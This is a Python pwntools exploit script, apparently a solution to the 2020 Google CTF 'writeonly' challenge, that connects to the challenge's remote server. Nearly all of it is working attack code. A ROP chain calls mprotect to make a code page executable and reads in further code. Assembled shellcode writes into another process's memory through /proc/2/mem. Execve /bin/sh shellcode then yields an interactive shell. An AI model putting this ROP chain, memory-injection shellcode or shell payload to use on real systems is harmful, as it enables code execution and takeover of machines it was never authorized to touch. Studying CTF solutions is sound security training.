from pwn import *

context.arch = 'amd64'
#r = process(['strace', './chal'])
#r = process('./chal')
#gdb.attach(r)
r = remote('writeonly.2020.ctfcompetition.com', 1337)
child_pid = int(r.recvuntil("?").split()[3])
assert(child_pid == 2)

code = 0x400000
PG_SIZE = 0x1000
mprotect = 0x450CB0
read = 0x44FCF0
pop_rdi_ret = 0x401716
pop_rsi_ret = 0x402a56
pop_rdx_ret = 0x44fd05
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

payload = ""
payload += p64(pop_rdi_ret)
payload += p64(code)
payload += p64(pop_rsi_ret)
payload += p64(PG_SIZE)
payload += p64(pop_rdx_ret)
payload += p64(7)
payload += p64(mprotect)
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_ret)
payload += p64(code)
payload += p64(pop_rdx_ret)
payload += p64(len(shellcode))
payload += p64(read)
payload += p64(code)



#child rsp 0x7fffffffde98
#parent rsp 0x7fffffffdec0
#offset -38

#35 39
sc = asm(
'''
    call n1
n1:
    pop rdi
    add rdi, d - $ + 1
    mov rsi, 2
    mov rdx, 0
    mov rax, 2
    syscall

    mov rbx, rax
    mov rdi, rbx
    push rsp
    pop rsi
    sub rsi, 32
    mov rdx, 0
    mov rax, 8
    syscall

l:
    mov rdi, rbx
    call n2
n2:
    pop rsi
    add rsi, d2 - $ + 1
    mov rdx, 120
    mov rax, 1
    syscall

    jmp l
d:
    .ascii "/proc/2/mem"
    .byte 0
d2:
'''
)

#raw_input()
#print((sc + payload).encode('hex'))
r.sendline('{}'.format(len(sc + payload)))
r.send(sc + payload)
#r.send(sc.replace("magic", str(child_pid)) + payload)
r.recvuntil(".")
r.send(shellcode)
r.interactive()